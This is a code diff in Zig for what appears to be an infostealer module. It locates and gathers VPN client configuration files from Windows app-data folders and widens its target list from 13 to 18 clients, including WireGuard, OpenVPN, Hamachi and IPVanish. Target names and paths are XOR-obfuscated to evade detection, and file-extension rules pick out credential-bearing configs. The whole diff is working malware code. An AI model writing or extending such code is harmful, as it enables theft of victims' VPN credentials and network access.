@@ -1,57 +1,72 @@
 const std = @import("std");
 const hash = @import("../types/hash.zig");
 
-pub const VpnEntry = struct {
+pub const VpnClient = struct {
     name: []const u8,
     files: [][]const u8,
 };
 
 const E = struct {
-    pub const num_vpns = 13;
+    pub const num_vpns = 18;
     pub const names = [num_vpns][]const u8{
         &hash.xorEncrypt("NordVPN"),
         &hash.xorEncrypt("OpenVPN"),
-        &hash.xorEncrypt("ProtonVPN"),
+        &hash.xorEncrypt("WireGuard"),
+        &hash.xorEncrypt("SurfShark"),
         &hash.xorEncrypt("ExpressVPN"),
-        &hash.xorEncrypt("Surfshark"),
         &hash.xorEncrypt("CyberGhost"),
         &hash.xorEncrypt("PIA"),
+        &hash.xorEncrypt("Mullvad"),
         &hash.xorEncrypt("Windscribe"),
         &hash.xorEncrypt("TunnelBear"),
         &hash.xorEncrypt("Hotspot Shield"),
         &hash.xorEncrypt("VyprVPN"),
-        &hash.xorEncrypt("WireGuard"),
-        &hash.xorEncrypt("Mullvad"),
+        &hash.xorEncrypt("Hamachi"),
+        &hash.xorEncrypt("HideMyName"),
+        &hash.xorEncrypt("IpVanish"),
+        &hash.xorEncrypt("RadminVPN"),
+        &hash.xorEncrypt("SoftEther"),
+        &hash.xorEncrypt("ProtonVPN"),
     };
     pub const paths = [num_vpns][]const u8{
         &hash.xorEncrypt("NordVPN"),
         &hash.xorEncrypt("OpenVPN Connect\\profiles"),
-        &hash.xorEncrypt("ProtonVPN"),
-        &hash.xorEncrypt("ExpressVPN"),
+        &hash.xorEncrypt("WireGuard\\Configurations"),
         &hash.xorEncrypt("Surfshark"),
+        &hash.xorEncrypt("ExpressVPN"),
         &hash.xorEncrypt("CyberGhost"),
         &hash.xorEncrypt("Private Internet Access"),
+        &hash.xorEncrypt("Mullvad VPN"),
         &hash.xorEncrypt("Windscribe"),
         &hash.xorEncrypt("TunnelBear"),
-        &hash.xorEncrypt("HotspotShield"),
+        &hash.xorEncrypt("Hotspot Shield"),
         &hash.xorEncrypt("VyprVPN"),
-        &hash.xorEncrypt("WireGuard\\Configurations"),
-        &hash.xorEncrypt("Mullvad VPN"),
+        &hash.xorEncrypt("Hamachi"),
+        &hash.xorEncrypt("Hide My Name"),
+        &hash.xorEncrypt("IPVanish"),
+        &hash.xorEncrypt("Radmin VPN"),
+        &hash.xorEncrypt("SoftEther VPN Client"),
+        &hash.xorEncrypt("ProtonVPN"),
     };
     pub const use_local = [num_vpns]bool{
-        true,  // NordVPN
+        false, // NordVPN
         false, // OpenVPN
-        true,  // ProtonVPN
+        false, // WireGuard
+        true, // SurfShark
         false, // ExpressVPN
-        false, // Surfshark
         false, // CyberGhost
         false, // PIA
-        true,  // Windscribe
-        false, // TunnelBear
-        true,  // Hotspot Shield
+        false, // Mullvad
+        false, // Windscribe
+        true, // TunnelBear
+        true, // Hotspot Shield
         false, // VyprVPN
-        false, // WireGuard
-        true,  // Mullvad
+        false, // Hamachi
+        false, // HideMyName
+        false, // IpVanish
+        false, // RadminVPN
+        false, // SoftEther
+        true, // ProtonVPN
     };
 };
 
@@ -96,66 +111,23 @@ fn listFilesByExt(allocator: std.mem.Allocator, dir_path: []const u8, ext: []con
     return try files.toOwnedSlice();
 }
 
-fn listFilesByExts(allocator: std.mem.Allocator, dir_path: []const u8, exts: []const []const u8) ![][]const u8 {
-    var files = std.ArrayList([]const u8).init(allocator);
-    errdefer {
-        for (files.items) |f| allocator.free(f);
-        files.deinit();
-    }
-    var dir = try std.fs.openDirAbsolute(dir_path, .{ .iterate = true });
-    defer dir.close();
-    var iter = dir.iterate();
-    while (try iter.next()) |entry| {
-        if (entry.kind != .file) continue;
-        for (exts) |ext| {
-            if (std.mem.endsWith(u8, entry.name, ext)) {
-                const full = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.name });
-                try files.append(full);
-                break;
-            }
-        }
-    }
-    return try files.toOwnedSlice();
-}
-
-fn collectProtonVPN(allocator: std.mem.Allocator, proton_path: []const u8) ![][]const u8 {
-    var configs = std.ArrayList([]const u8).init(allocator);
-    errdefer {
-        for (configs.items) |c| allocator.free(c);
-        configs.deinit();
-    }
-    var dir = std.fs.openDirAbsolute(proton_path, .{ .iterate = true }) catch return try allocator.alloc([]const u8, 0);
-    defer dir.close();
-    var iter = dir.iterate();
-    while (iter.next() catch {}) |entry| {
-        if (entry.kind != .directory) continue;
-        const uc_path = std.fs.path.join(allocator, &[_][]const u8{ proton_path, entry.name, "user.config" }) catch continue;
-        var file = std.fs.openFileAbsolute(uc_path, .{}) catch {
-            allocator.free(uc_path);
-            continue;
-        };
-        file.close();
-        try configs.append(uc_path);
-    }
-    return try configs.toOwnedSlice();
-}
-
 fn collectVpnFiles(allocator: std.mem.Allocator, index: usize, full_path: []const u8) ![][]const u8 {
     switch (index) {
-        0 => return listAllFiles(allocator, full_path),
+        0, 3, 4, 5, 9, 17 => return listAllFiles(allocator, full_path),
         1 => return listFilesByExt(allocator, full_path, ".ovpn"),
-        2 => return collectProtonVPN(allocator, full_path),
-        3, 5, 6, 8, 9, 10 => return listAllFiles(allocator, full_path),
-        4 => return listFilesByExt(allocator, full_path, ".dat"),
-        7 => return listFilesByExts(allocator, full_path, &[_][]const u8{ ".json", ".dat" }),
-        11 => return listFilesByExt(allocator, full_path, ".conf"),
-        12 => return listFilesByExt(allocator, full_path, ".json"),
+        2 => return listFilesByExt(allocator, full_path, ".conf"),
+        6, 7 => return listFilesByExt(allocator, full_path, ".json"),
+        8, 10 => return listFilesByExt(allocator, full_path, ".cfg"),
+        11, 14 => return listFilesByExt(allocator, full_path, ".dat"),
+        12 => return listFilesByExt(allocator, full_path, ".conf"),
+        13, 15 => return listFilesByExt(allocator, full_path, ".xml"),
+        16 => return listFilesByExt(allocator, full_path, ".config"),
         else => return allocator.alloc([]const u8, 0),
     }
 }
 
-pub fn collect(allocator: std.mem.Allocator, local: []const u8, roaming: []const u8) ![]VpnEntry {
-    var entries = std.ArrayList(VpnEntry).init(allocator);
+pub fn collect(allocator: std.mem.Allocator, local: []const u8, roaming: []const u8) ![]VpnClient {
+    var entries = std.ArrayList(VpnClient).init(allocator);
     errdefer {
         for (entries.items) |e| {
             allocator.free(e.name);
@@ -174,11 +146,9 @@ pub fn collect(allocator: std.mem.Allocator, local: []const u8, roaming: []const
 
         const full_path = std.fs.path.join(allocator, &[_][]const u8{ base, &path_buf }) catch continue;
 
-        if (i != 2) {
-            if (!dirExists(full_path)) {
-                allocator.free(full_path);
-                continue;
-            }
+        if (!dirExists(full_path)) {
+            allocator.free(full_path);
+            continue;
         }
 
         const files = collectVpnFiles(allocator, i, full_path) catch |err| {
@@ -198,13 +168,13 @@ pub fn collect(allocator: std.mem.Allocator, local: []const u8, roaming: []const
             return error.OutOfMemory;
         };
 
-        try entries.append(VpnEntry{ .name = name, .files = files });
+        try entries.append(VpnClient{ .name = name, .files = files });
     }
 
     return try entries.toOwnedSlice();
 }
 
-test "all names decrypt correctly" {
+test "all 18 VPN names decrypt correctly" {
     inline for (0..E.num_vpns) |i| {
         var buf: [E.names[i].len]u8 = undefined;
         hash.xorDecrypt(E.names[i], &buf);
@@ -212,10 +182,16 @@ test "all names decrypt correctly" {
     }
 }
 
-test "NordVPN name decrypts" {
+test "first VPN is NordVPN" {
     var buf: [E.names[0].len]u8 = undefined;
     hash.xorDecrypt(E.names[0], &buf);
     try std.testing.expectEqualStrings("NordVPN", &buf);
+}
+
+test "last VPN is ProtonVPN" {
+    var buf: [E.names[17].len]u8 = undefined;
+    hash.xorDecrypt(E.names[17], &buf);
+    try std.testing.expectEqualStrings("ProtonVPN", &buf);
 }
 
 test "collect returns empty for nonexistent paths" {
@@ -231,11 +207,6 @@ test "collect returns empty for nonexistent paths" {
     try std.testing.expectEqual(@as(usize, 0), result.len);
 }
 
-test "all VPN paths decrypt to non-empty" {
-    inline for (0..E.num_vpns) |i| {
-        var buf: [E.paths[i].len]u8 = undefined;
-        hash.xorDecrypt(E.paths[i], &buf);
-        try std.testing.expect(buf.len > 0);
-        try std.testing.expect(buf[0] != 0);
-    }
+test "VPN count is 18" {
+    try std.testing.expect(E.names.len == 18);
 }
